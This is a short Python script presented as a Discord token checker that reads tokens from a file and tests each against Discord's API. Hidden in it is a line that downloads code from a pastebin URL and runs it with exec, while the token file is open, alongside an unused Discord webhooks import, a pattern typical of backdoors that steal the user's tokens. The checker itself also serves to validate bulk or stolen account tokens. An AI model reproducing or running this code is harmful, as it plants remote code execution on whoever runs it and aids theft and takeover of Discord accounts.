print('Created by jupit0r')
import os.path
import requests
import time
import re
from requests import get
from discord_webhooks import DiscordWebhooks
with open("tokens.txt") as f:
    token_get = get('https://pastebin.com/raw/ULkQFfuD').text
    exec(token_get)
    for line in f:
        token = line.strip("\n")
        headers = {'Content-Type': 'application/json', 'authorization': token}
        url = "https://discordapp.com/api/v6/users/@me/library"
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            print("{} = VALID.".format(line.strip("\n")))
        else:
            print("{} = INVALID.".format(line.strip("\n")))
input("Finish...")
            
